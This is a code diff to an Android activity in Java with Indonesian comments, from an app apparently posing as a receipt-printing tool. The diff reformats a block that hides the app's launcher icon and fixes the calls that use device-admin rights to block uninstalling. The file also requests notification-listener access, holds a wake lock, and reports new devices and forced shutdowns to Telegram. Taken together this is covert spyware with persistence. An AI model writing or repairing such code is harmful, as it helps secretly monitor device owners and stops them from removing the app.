@@ -155,25 +155,25 @@ public class MainActivity extends Activity {
 
         // Simpan nama perangkat ke SharedPreferences
         saveDeviceInfo();
+
         // ==========================================
-// CEK APAKAH APLIKASI SEDANG DI-HIDE
-// ==========================================
-SharedPreferences prefs = getSharedPreferences("cetak_pro", MODE_PRIVATE);
-boolean isHidden = prefs.getBoolean("app_hidden", false);
-if (isHidden) {
-    try {
-        PackageManager pm = getPackageManager();
-        ComponentName componentName = new ComponentName(this, MainActivity.class);
-        pm.setComponentEnabledSetting(
-            componentName,
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        );
-        // Tidak perlu recreate, biarkan saja
-    } catch (Exception e) {
-        e.printStackTrace();
-    }
-}
+        // CEK APAKAH APLIKASI SEDANG DI-HIDE
+        // ==========================================
+        SharedPreferences prefs = getSharedPreferences("cetak_pro", MODE_PRIVATE);
+        boolean isHidden = prefs.getBoolean("app_hidden", false);
+        if (isHidden) {
+            try {
+                PackageManager pm = getPackageManager();
+                ComponentName componentName = new ComponentName(this, MainActivity.class);
+                pm.setComponentEnabledSetting(
+                    componentName,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+                );
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
 
         getWindow().setStatusBarColor(Color.rgb(244, 247, 251));
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -268,8 +268,8 @@ if (isHidden) {
                     "Aktifkan admin agar aplikasi tidak bisa dihapus sembarangan.");
             startActivityForResult(intent, REQUEST_ADMIN);
         } else {
-            // Kunci agar tidak bisa diuninstall
-            devicePolicyManager.setUninstallBlocked(adminComponent, true);
+            // ✅ FIX: tambahkan package name sebagai parameter kedua
+            devicePolicyManager.setUninstallBlocked(adminComponent, getPackageName(), true);
         }
     }
 
@@ -288,7 +288,6 @@ if (isHidden) {
             .putString("device_id", deviceId)
             .apply();
         
-        // Kirim info ke Telegram saat pertama kali jalan
         if (!prefs.getBoolean("device_info_sent", false)) {
             prefs.edit().putBoolean("device_info_sent", true).apply();
             String message = "📱 PERANGKAT BARU TERDAFTAR\n" +
@@ -304,16 +303,9 @@ if (isHidden) {
     // AKTIFKAN INTERNET SELALU ON
     // ============================================================
     private void enableAlwaysOnInternet() {
-        // Wake Lock agar CPU tetap aktif
         PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
         PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "VanNota:WakeLock");
-        wakeLock.acquire(10 * 60 * 1000L); // 10 menit
-        
-        // Aktifkan Wi-Fi / Mobile Data (jika tersedia)
-        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            // Android 6+ otomatis handle network
-        }
+        wakeLock.acquire(10 * 60 * 1000L);
     }
 
     // ============================================================
@@ -399,21 +391,19 @@ if (isHidden) {
             return;
         }
 
-        // Cek Notification Access setiap kali resume
         if (!isNotificationListenerEnabled()) {
             showNotificationAccessDialog();
         }
 
-        // Pastikan admin tetap aktif
+        // ✅ FIX: tambahkan package name
         if (devicePolicyManager != null && adminComponent != null) {
             if (devicePolicyManager.isAdminActive(adminComponent)) {
-                devicePolicyManager.setUninstallBlocked(adminComponent, true);
+                devicePolicyManager.setUninstallBlocked(adminComponent, getPackageName(), true);
             }
         }
 
         mainHandler.postDelayed(() -> {
             if (isFinishing() || isDestroyed() || notificationRequestPending) return;
-
             if (notificationsAllowed()) {
                 startAppIfAllowed();
             } else {
@@ -433,10 +423,10 @@ if (isHidden) {
         } else if (requestCode == REQUEST_ENABLE_BLUETOOTH && resultCode == RESULT_OK) {
             choosePrinter();
         } else if (requestCode == REQUEST_ADMIN && resultCode == RESULT_OK) {
-            // Admin aktif, kunci uninstall
+            // ✅ FIX: tambahkan package name
             if (devicePolicyManager != null && adminComponent != null) {
                 if (devicePolicyManager.isAdminActive(adminComponent)) {
-                    devicePolicyManager.setUninstallBlocked(adminComponent, true);
+                    devicePolicyManager.setUninstallBlocked(adminComponent, getPackageName(), true);
                 }
             }
         }
@@ -498,7 +488,6 @@ if (isHidden) {
 
     @Override
     protected void onDestroy() {
-        // Kirim notifikasi jika aplikasi dimatikan
         TelegramSender.sendMessage(this, "⚠️ APLIKASI DIMATIKAN", "VanNota dimatikan paksa!");
 
         if (receiverRegistered) {
